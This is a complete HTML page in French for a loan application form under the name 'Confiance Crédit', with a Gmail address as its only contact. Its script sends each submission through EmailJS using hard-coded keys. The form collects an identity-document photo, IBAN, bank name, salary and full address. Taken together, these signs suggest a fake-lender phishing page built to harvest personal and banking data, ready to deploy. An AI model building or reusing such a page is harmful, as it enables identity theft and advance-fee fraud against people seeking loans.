<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Confiance Crédit - Demande de prêt</title>
  <link rel="stylesheet" href="style.css">
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("c8ZN5oyhh7vUaeXzd"); // Remplace par ton Public Key EmailJS
    })();
    
    function sendEmail(event) {
      event.preventDefault();
      emailjs.sendForm("service_8ukh7wp","template_0axeamd", event.target)
        .then(() => {
          alert("Votre demande a été envoyée !");
          window.location.href = "thank-you.html"; // Redirection après envoi
        }, (error) => {
          alert("Erreur lors de l’envoi : " + JSON.stringify(error));
        });
    }
  </script>
</head>
<body>

<header>
  <img src="images/logo.png" alt="Logo Confiance Crédit" class="logo">
  <nav>
    <a href="index.html">Accueil</a>
    <a href="services.html">Services</a>
    <a href="expertise.html">Expertise</a>
    <a href="form.html" class="active">Demande de prêt</a>
    <a href="contact.html">Contact</a>
  </nav>
</header>

<main>
  <section class="hero">
    <h1>Formulaire de Demande de Prêt</h1>
    <p>Remplissez le formulaire ci-dessous pour faire votre demande de prêt.</p>
  </section>

  <section class="form-section">
    <form onsubmit="sendEmail(event)">
      <label>Prénom : <input type="text" name="prenom" required></label>
      <label>Nom : <input type="text" name="nom" required></label>
      <label>Date de naissance : <input type="date" name="naissance" required></label>
      <label>Adresse exacte : <input type="text" name="adresse" required></label>
      <label>Pays : <input type="text" name="pays" required></label>
      <label>Profession : <input type="text" name="profession" required></label>
      <label>Salaire : <input type="number" name="salaire" required></label>
      <label>Email : <input type="email" name="email" required></label>
      <label>Montant du prêt : <input type="number" name="montant" required></label>
      <label>Période de remboursement : <input type="text" name="periode" required></label>
      <label>Photo de pièce d’identité : <input type="file" name="piece_identite"></label>
      <label>IBAN : <input type="text" name="iban"></label>
      <label>Nom de la banque : <input type="text" name="banque"></label>
      <label>Propriétaire du compte : <input type="text" name="proprietaire"></label>
      <button type="submit">Soumettre</button>
    </form>
  </section>
</main>

<footer>
  &copy; 2019 - 2025 Confiance Crédit | Paris, France | Email : confiancecredit.fr@gmail.com
</footer>

<style>
  /* Logo */
  .logo {height: 90px; display: block; margin: 20px auto;}

  /* Menu horizontal */
  nav {text-align:center; margin-bottom:20px;}
  nav a {
    margin: 0 15px;
    text-decoration:none;
    font-weight:bold;
    color:#2C3E50;
    transition: color 0.3s;
  }
  nav a.active, nav a:hover {color:#18BC9C;}

  /* Hero */
  .hero {text-align:center; padding:60px 20px; background:linear-gradient(to right, #2C3E50, #18BC9C); color:white;}
  .hero h1 {font-size:2.5rem; margin-bottom:15px;}
  .hero p {font-size:1.2rem; margin-bottom:30px;}

  /* Formulaire */
  .form-section {max-width:600px; margin:40px auto; padding:0 20px;}
  form {display:flex; flex-direction:column; gap:15px;}
  input[type=text], input[type=email], input[type=number], input[type=date], input[type=file] {
    padding:10px; border-radius:5px; border:1px solid #ccc; width:100%;
  }
  button {padding:15px; border:none; border-radius:5px; background-color:#18BC9C; color:white; font-weight:bold; cursor:pointer; font-size:1rem;}
  button:hover {background-color:#2C3E50;}

  /* Footer */
  footer {text-align:center; padding:20px; background-color:#2C3E50; color:white; margin-top:40px;}
</style>

</body>
</html>
